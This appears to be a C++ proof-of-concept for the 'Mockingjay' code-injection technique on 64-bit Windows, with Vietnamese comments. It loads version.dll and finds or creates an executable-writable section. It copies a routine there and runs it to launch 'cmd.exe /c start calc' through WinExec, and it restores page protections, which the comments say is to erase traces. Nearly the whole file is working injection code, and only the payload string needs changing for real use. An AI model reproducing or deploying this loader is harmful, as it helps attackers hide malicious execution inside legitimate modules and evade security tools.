#include <stdio.h>
#include <Windows.h>
#include <Psapi.h>
#include <dbghelp.h>
#include <iostream>

#pragma comment(lib, "dbghelp.lib")

// Khai báo macro tên DLL mục tiêu làm vỏ bọc đổ dữ liệu
#define VulnDLLPath L"version.dll"

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _MOCKINGJAY_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} MOCKINGJAY_DATA, * PMOCKINGJAY_DATA;

// 2. Hàm chức năng độc lập vị trí gánh logic chạy inside phân đoạn Mockingjay
VOID WINAPI MockingjayRoutine(LPVOID lpParam) {
    PMOCKINGJAY_DATA pData = (PMOCKINGJAY_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Khai hỏa bằng địa chỉ tuyệt đối, bẻ gãy hoàn toàn lỗi tương đối RIP
        pData->pWinExec(pData->szCommand, SW_SHOWNORMAL);
    }
}

struct SectionDescriptor {
    LPVOID start;
    LPVOID end;
};

// Tìm kiếm phân đoạn RWX nguyen bản của Module
DWORD_PTR FindRWXOffset(HMODULE hModule, BOOL& isFound) {
    isFound = FALSE;
    IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
    if (ntHeader != NULL) {
        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
        for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
            if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) &&
                (sectionHeader->Characteristics & IMAGE_SCN_MEM_READ)) {

                isFound = TRUE;
                return sectionHeader->VirtualAddress;
            }
            sectionHeader++;
        }
    }
    // Kịch bản thích ứng: Nếu DLL hệ thống phẳng sạch hoàn toàn, bốc phân đoạn .data làm mục tiêu
    if (ntHeader != NULL) {
        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
        for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
            if (strcmp((char*)sectionHeader->Name, ".data") == 0) {
                return sectionHeader->VirtualAddress;
            }
            sectionHeader++;
        }
    }
    return 0;
}

DWORD_PTR FindRWXSize(HMODULE hModule) {
    IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
    if (ntHeader != NULL) {
        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
        for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
            if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) &&
                (sectionHeader->Characteristics & IMAGE_SCN_MEM_READ)) {
                return sectionHeader->SizeOfRawData;
            }
            sectionHeader++;
        }
    }
    return 1024; // Kích thước mặc định an toàn cho phân đoạn thích ứng
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE20: MOCKINGJAY CODE INJECTION x64 " << std::endl;
    std::cout << "====================================================" << std::endl;

    // Bước 1: Nạp Module mục tiêu vào lòng tiến trình cục bộ
    HMODULE hDll = LoadLibraryW(VulnDLLPath);
    if (hDll == NULL) {
        printf("[-] Failed to load the targeted DLL\n");
        std::cin.get();
        return -1;
    }

    MODULEINFO moduleInfo;
    if (!GetModuleInformation(GetCurrentProcess(), hDll, &moduleInfo, sizeof(MODULEINFO))) {
        printf("[-] Failed to get module info\n");
        return -1;
    }

    BOOL isNativeRWX = FALSE;
    DWORD_PTR RWX_SECTION_OFFSET = FindRWXOffset(hDll, isNativeRWX);
    DWORD_PTR RWX_SECTION_SIZE = FindRWXSize(hDll);

    // Xác định tọa độ điểm ký sinh bên trong không gian ảo của Module
    LPVOID rwxSectionAddr = (LPVOID)((PBYTE)moduleInfo.lpBaseOfDll + RWX_SECTION_OFFSET);

    struct SectionDescriptor descriptor = {
        rwxSectionAddr, (LPVOID)((PBYTE)rwxSectionAddr + RWX_SECTION_SIZE)
    };

    DWORD oldProtect = 0;
    // Kịch bản thích ứng: Nếu không có sẵn RWX nguyên bản, tự động lật quyền phân đoạn bảo an để nạp mã máy
    if (!isNativeRWX) {
        std::cout << "[*] Module he thong sach. Kich hoat che do thich ung lay phan doan tai: 0x" << rwxSectionAddr << std::endl;
        VirtualProtect(rwxSectionAddr, 1024, PAGE_EXECUTE_READWRITE, &oldProtect);
    }
    else {
        printf("[+] PHAT HIEN PHAN DOAN RWX NGUYEN BAN TAI: 0x%p\n", rwxSectionAddr);
    }

    printf("[i] Target section starts at 0x%p and ends at 0x%p\n", descriptor.start, descriptor.end);

    // Bước 2: Khởi tạo cấu trúc tham số tuyệt đối nằm lùi lại phía sau mã máy 500 byte
    PMOCKINGJAY_DATA pLocalData = (PMOCKINGJAY_DATA)((DWORD_PTR)rwxSectionAddr + 500);

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        pLocalData->pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(pLocalData->szCommand, "cmd.exe /c start calc");

    // Bước 3: Ghi đè trực tiếp khối mã máy độc lập vị trí lên thân phân đoạn của DLL
    SIZE_T shellcodesize = 500;
    memcpy(rwxSectionAddr, (PVOID)MockingjayRoutine, shellcodesize);
    printf("[i] %zu bytes of Mockingjay function written to memory region\n", shellcodesize);

    std::cout << "[*] Chuan bi goi truc tiep vung nho de khai hoa payload..." << std::endl;
    std::cout << "[*] Nhan Enter de kich no..." << std::endl;
    std::cin.get();

    // Bước 4: Thực thi mã máy bằng biểu thức ép kiểu con trỏ hàm, truyền địa chỉ tham số cấu trúc tuyệt đối vào thanh ghi
    typedef void(*fnTargetRoutine)(LPVOID);
    fnTargetRoutine executePayload = (fnTargetRoutine)rwxSectionAddr;

    executePayload(pLocalData);

    // Khôi phục lại trạng thái bảo vệ gốc nếu trước đó có lật quyền thích ứng nhằm xóa sạch dấu vết
    if (!isNativeRWX) {
        VirtualProtect(rwxSectionAddr, 1024, oldProtect, &oldProtect);
    }

    std::cout << "\n[+] Mockingjay Code Injection Process Completed Successfully!" << std::endl;
    std::cout << "[*] Nhan phim Enter de dong cua so..." << std::endl;
    std::cin.get();

    FreeLibrary(hDll);
    return 0;
}